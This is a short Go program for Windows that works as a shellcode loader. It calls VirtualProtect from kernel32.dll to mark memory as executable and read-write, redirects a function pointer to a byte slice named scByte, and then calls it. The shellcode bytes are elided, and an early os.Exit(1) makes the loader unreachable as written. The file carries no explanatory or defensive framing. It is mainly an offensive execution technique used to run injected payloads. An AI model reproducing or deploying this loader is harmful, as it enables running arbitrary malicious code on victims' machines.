package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func main() {

	os.Exit(1)

	scByte := []byte{0xfc, ..., 0xd5}

	f := func() {}
	var oldfperms uint32

	if !VirtualProtect(
		unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))),
		unsafe.Sizeof(uintptr(0)),
		uint32(0x40),
		unsafe.Pointer(&oldfperms)) {
		fmt.Println("VirtualProtect failed!")
		os.Exit(1)
	}


	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&scByte))


	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&scByte))), uintptr(len(scByte)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		fmt.Println("VirtualProtect failed!")
		os.Exit(1)
	}


	f()
}
